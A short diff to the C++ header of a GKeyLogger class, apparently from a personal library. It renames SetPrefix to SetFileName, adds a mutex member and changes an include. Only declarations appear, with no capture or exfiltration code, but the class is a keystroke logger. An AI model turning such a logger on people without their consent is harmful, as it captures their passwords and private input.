@@ -3,10 +3,12 @@
 # define __GKEYLOGGER_H__
 
 #include "GString.h"
-#include "GDate.h"
+#include "GDateTime.h"
 #include "GFile.h"
 #include "GThread.h"
 #include "GMap.hpp"
+#include "GMutex.h"
+
 #if defined (GWIN)
 #		include "windows.h"
 #endif
@@ -19,7 +21,7 @@ class GKeyLogger
 
 		void	Activate(void);
 		void	SetDirectory(const GString &Directory);
-		void	SetPrefix(const GString &Prefix);
+		void	SetFileName(const GString &Prefix);
 		void	Desactivate(void);
 		bool	IsActivated(void) const;
 		void	GetPath(void) const;
@@ -28,6 +30,7 @@ class GKeyLogger
 	private:
 		bool			_activate;
 		GThread			_thread;
+		GMutex			_mutex;
 };
 
 #endif
